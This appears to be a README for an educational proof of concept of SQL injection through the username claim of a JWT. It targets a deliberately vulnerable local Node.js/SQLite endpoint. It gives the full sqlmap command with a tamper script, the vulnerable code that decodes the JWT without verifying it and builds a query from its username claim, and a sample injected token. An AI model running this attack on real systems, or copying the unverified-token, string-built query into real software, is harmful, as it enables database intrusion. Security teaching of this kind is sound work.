# sqlmap jwt tampering on node.js sqlite application
POC for educational purposes

Application is based on [https://github.com/jerrychong25/node-express-sqlite-jwt-typescript-typeorm](https://github.com/jerrychong25/node-express-sqlite-jwt-typescript-typeorm)

I initially wrote an tamper script but [this](https://www.craftypenguins.net/capture-the-flag-ctf-challenge-part-5/) article, written by Curtis Hildebrand, offered a much more mature script. 

## Getting Started

First we need to get our environment up and running
```
npm i
npm start
```
Should open a server at http://localhost:3000

## Burp
to make view the traffic of sqlmap we can open up Burp suite to proxy through localhost:8080


## sqlmap

make sure to install sqlmap
`brew install sqlmap`

## command explained
```Bash
sqlmap -u  http://localhost:3000/user/vulnEndpoint --flush-session --fresh-queries --headers "auth:*" --dbms sqlite3 --proxy "http://localhost:8080" --risk 3 --level=5 --tamper tamper.py --tables --data ""
```

Our vulnerable endpoint `http://localhost:3000/user/vulnEndpoint` would be bombarded with requests containing the auth header specified by `--headers "auth:*"` we are using a sqlite3 database. As mentioned we would proxy traffic through burp suite, risk and level set to high to perform all the tests fast. the `--tamper` flag specifies the tamper script that sqlmap would use. `--tables` - we would like a list of tables after the succesful exploitation. And lastly we would pass the `--data` flag to force a POST request.

## Code

Our vulnerable endpoint looks like this:
```Typescript
static postVulnerableEndpoint = async (req: Request, res: Response) => {
    //auth header example: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoic3FsaXRlX3ZlcnNpb24oKTsgLS0gIiwiaWF0IjoxNjUxMzA1NzU0LCJleHAiOjE2NTEzMDkzNTR9.KEfRab8qizSrWH59J1dJjgHrTL85C8VZBtBmuceivOc
    let token: string = req.headers["auth"].toString();
    let jwtPayload = <any>decode(token);
    if(!jwtPayload || token==""){
      console.log("jwtPayload",jwtPayload)
      res.send("error no username found in token / token not decoded currectly")
      return;
    }
    else{
      console.log(jwtPayload.username)

      let q = `SELECT ${jwtPayload.username} FROM user`
      const entityManager = getManager();
      let response = "";
      try{
        const someQuery = await entityManager.query(q)
        response = JSON.stringify(someQuery)
      }
      catch (error){
        res.send("error logging in as :"+ error);
        return;
      }
        res.send("VulnEndpoint logged in as :"+ response );
        return

      }
    };
```

We have a decode function that would take the JWT token from the "auth" header and simply provide us with the username parameter. The applicaiton would then craft a non-parameterized dynamic query using the username parameter and query the database.
the reponse or error would then be sent back to the user.

